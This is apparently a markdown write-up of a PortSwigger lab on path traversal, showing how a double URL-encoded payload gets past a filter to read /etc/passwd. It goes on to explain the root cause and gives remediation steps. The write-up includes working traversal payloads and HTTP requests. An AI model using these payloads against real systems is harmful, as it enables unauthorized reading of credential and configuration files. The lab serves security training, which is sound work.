@@ -1,0 +1,247 @@
+# File Path Traversal with Superfluous URL Decode
+
+## Lab Information
+
+| Field | Value |
+|-------|-------|
+| Lab | File path traversal with superfluous URL decode |
+| Category | Path Traversal / Directory Traversal |
+| Severity | High |
+| CWE | CWE-22 – Improper Limitation of a Pathname to a Restricted Directory |
+| OWASP Top 10 | A01:2021 – Broken Access Control |
+
+---
+
+# Executive Summary
+
+The application was vulnerable to a **Path Traversal** vulnerability caused by inconsistent input processing. Although the application attempted to filter traversal sequences, it performed an additional URL decoding step after the validation process.
+
+By supplying a **double URL-encoded** payload, the traversal sequences bypassed the filter and were decoded into valid directory traversal characters before the file was accessed.
+
+This allowed arbitrary files outside the intended directory to be read, including the sensitive `/etc/passwd` file.
+
+---
+
+# Objective
+
+Read the contents of:
+
+```text
+/etc/passwd
+```
+
+---
+
+# Vulnerability Discovery
+
+Product images were loaded using the following request:
+
+```http
+GET /image?filename=56.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+The `filename` parameter was directly used to retrieve files from the filesystem.
+
+A standard traversal payload such as:
+
+```text
+../../../etc/passwd
+```
+
+or its single URL-encoded version:
+
+```text
+..%2f..%2f..%2fetc/passwd
+```
+
+was blocked, indicating that the application performed input filtering.
+
+---
+
+# Exploitation
+
+A **double URL-encoded** payload was supplied:
+
+```text
+..%252f..%252f..%252fetc/passwd
+```
+
+Modified request:
+
+```http
+GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+---
+
+# Result
+
+The application returned the contents of the Linux password file.
+
+Example:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+The successful disclosure confirmed that arbitrary files outside the intended directory could be accessed.
+
+---
+
+# Technical Analysis
+
+The vulnerability exists because the application performs **multiple URL decoding operations** while validating the input only once.
+
+The payload progression is:
+
+```
+Attacker input
+↓
+..%252f..%252f..%252fetc/passwd
+
+First URL decoding
+↓
+..%2f..%2f..%2fetc/passwd
+
+Second URL decoding
+↓
+../../../etc/passwd
+
+Filesystem access
+↓
+/etc/passwd
+```
+
+The security filter inspects the input before the second decoding step and therefore never detects the actual traversal sequence.
+
+---
+
+# Root Cause
+
+The application validates the user input before completing all decoding operations.
+
+A likely implementation resembles:
+
+```text
+Receive input
+↓
+Validate filename
+↓
+URL Decode
+↓
+Access file
+```
+
+Instead, decoding should occur **before** validation:
+
+```text
+Receive input
+↓
+URL Decode
+↓
+Canonicalize path
+↓
+Validate path
+↓
+Access file
+```
+
+---
+
+# Proof of Concept
+
+## Original Request
+
+```http
+GET /image?filename=56.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+## Malicious Request
+
+```http
+GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+---
+
+# Impact
+
+A successful attacker may be able to:
+
+- Read arbitrary files from the server.
+- Access configuration files containing credentials.
+- Retrieve application source code.
+- Leak API keys and secrets.
+- Gather sensitive information for privilege escalation.
+- Chain the vulnerability with additional attacks leading to Remote Code Execution.
+
+---
+
+# Root Cause Illustration
+
+```
+User Input
+↓
+..%252f..%252f..%252fetc/passwd
+
+Validation
+↓
+No "../" detected ✓
+
+First URL Decode
+↓
+..%2f..%2f..%2fetc/passwd
+
+Second URL Decode
+↓
+../../../etc/passwd
+
+Filesystem
+↓
+/etc/passwd
+```
+
+---
+
+# Remediation
+
+Recommended mitigations include:
+
+- Perform URL decoding only once.
+- Decode the input completely before validation.
+- Canonicalize the filesystem path using functions such as `realpath()`.
+- Verify that the resolved path remains inside the intended directory.
+- Reject any request containing traversal components after decoding.
+- Use allowlists of expected filenames instead of accepting arbitrary paths.
+
+---
+
+# References
+
+- PortSwigger Web Security Academy – Path Traversal
+- OWASP Path Traversal
+- CWE-22 – Improper Limitation of a Pathname to a Restricted Directory
+
+---
+
+# Key Takeaways
+
+This lab demonstrates how multiple decoding operations can invalidate otherwise effective input validation.
+
+Even when traversal sequences appear to be filtered, attackers can often bypass the protection by encoding malicious characters multiple times.
+
+The correct defensive approach is to:
+
+1. Fully decode the input.
+2. Canonicalize the resulting path.
+3. Validate the canonical path.
+4. Only then access the requested file.
+
+Failing to follow this order can leave applications vulnerable to traversal attacks despite the presence of input filtering.
